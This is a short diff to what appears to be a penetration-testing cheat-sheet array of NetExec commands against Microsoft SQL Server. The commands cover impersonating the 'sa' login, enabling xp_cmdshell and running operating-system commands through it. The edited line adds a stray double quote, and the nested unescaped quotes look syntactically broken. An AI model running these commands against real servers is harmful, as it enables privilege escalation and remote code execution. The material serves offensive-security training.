@@ -474,7 +474,7 @@ const D = [
 ["MSSQL Kerberos","nxc mssql {DC} --use-kcache",["osep"]],
 ["MSSQL Exploitation","nxc mssql {DC} -u {USER} -p {PASS} -M enum_impersonate --local-auth",["example"]],
 ["Confirming sysadmin Membership","nxc mssql {DC} -u {USER} -p {PASS} -M mssql_priv --local-auth",["example"]],
-["Switching Context to sa","nxc mssql {DC} -u {USER} -p {PASS} --local -q "EXECUTE AS LOGIN='sa'; SELECT SYSTEM_USER;"",["example"]],
+["Switching Context to sa","nxc mssql {DC} -u {USER} -p {PASS} --local -q "EXECUTE AS LOGIN='sa'; SELECT SYSTEM_USER;""",["example"]],
 ["Enabling xp_cmdshell for OS Command Execution","nxc mssql {DC} -u {USER} -p {PASS} --local -q "EXECUTE AS LOGIN='sa'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"",["example"]],
 ["Confirming Remote Code Execution via xp_cmdshell","nxc mssql {DC} -u {USER} -p {PASS} --local -q "EXECUTE AS LOGIN='sa'; EXEC xp_cmdshell 'ipconfig';"",["example"]],
 ["MSSQL with multiple users","nxc mssql {DC} -u julio grace -p {PASS} --local-auth",["example"]],
